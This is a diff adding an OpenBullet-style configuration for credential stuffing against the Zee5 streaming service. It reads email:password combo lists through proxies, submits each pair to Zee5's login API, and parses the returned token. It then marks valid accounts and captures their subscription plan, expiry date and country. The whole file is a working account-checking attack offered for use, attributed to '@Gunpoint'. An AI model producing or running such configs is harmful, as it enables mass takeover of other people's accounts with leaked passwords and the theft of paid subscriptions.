@@ -1,0 +1,64 @@
+[SETTINGS]
+{
+  "Name": "Zee5",
+  "SuggestedBots": 100,
+  "LastModified": "2019-04-28T00:01:48.367777+05:30",
+  "AdditionalInfo": "Get Fu*ked ",
+  "Author": "@Gunpoint",
+  "Version": "1.0.1",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#REQUEST_GET REQUEST GET "https://userapi.zee5.com/v1/user/loginemail?email=<USER>&password=<PASS>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: bearer <token>" 
+
+PARSE "<SOURCE>" LR "{\"token\":\"" "\"}" -> VAR "token" 
+
+REQUEST GET "https://userapi.zee5.com/v1/user" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cacheAccept: application/json, text/plain, */*" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: bearer <token>" 
+  HEADER "Origin: https://www.zee5.com" 
+  HEADER "Referer: https://www.zee5.com/signin/email" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Invalid authentication token\"}]}" 
+  KEYCHAIN Success OR 
+    KEY "\",\"registration_country" 
+
+REQUEST GET "https://subscriptionapi.zee5.com/v1/subscription?translation=en&include_all=true" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: bearer <token>" 
+
+PARSE "<SOURCE>" LR "\",\"description\":\"" "\",\"" -> CAP "Subscription" 
+
+PARSE "<SOURCE>" LR "\"subscription_end\":\"" "T23:59:59Z\",\"" -> CAP "Expiry" 
+
+PARSE "<SOURCE>" LR "\"country\":\"" "\",\"" -> CAP "Country" 
+
